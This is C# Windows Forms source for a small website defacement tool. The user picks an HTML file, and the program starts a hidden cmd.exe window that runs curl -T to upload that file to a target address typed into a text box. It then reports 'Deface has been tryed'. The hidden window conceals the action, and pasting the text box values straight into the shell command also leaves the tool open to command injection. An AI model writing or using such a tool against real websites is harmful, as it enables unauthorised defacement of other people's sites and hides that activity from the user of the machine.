using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.Linq;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace WindowsFormsApp5
{
    public partial class Form1 : Form
    {
        public Form1()
        {
            InitializeComponent();
        }

        OpenFileDialog ofd = new OpenFileDialog();

        private void button1_Click(object sender, EventArgs e)
        {
            ProcessStartInfo ps = new ProcessStartInfo();
            ps.FileName = "cmd.exe";
            ps.WindowStyle = ProcessWindowStyle.Hidden;
            ps.Arguments = @"/k curl -T " + textbox1.Text + " " + textBox2.Text;
            Process.Start(ps);

            MessageBox.Show("Deface has been tryed");

        }

        private void button2_Click(object sender, EventArgs e)
        {

            ofd.Filter = "HTML|*.html";
            if (ofd.ShowDialog() == DialogResult.OK)
            {

                textbox1.Text = ofd.FileName;

            }


        }

        private void Form1_Load(object sender, EventArgs e)
        {

        }

        private void button3_Click(object sender, EventArgs e)
        {
            this.Close();
        }
    }
}
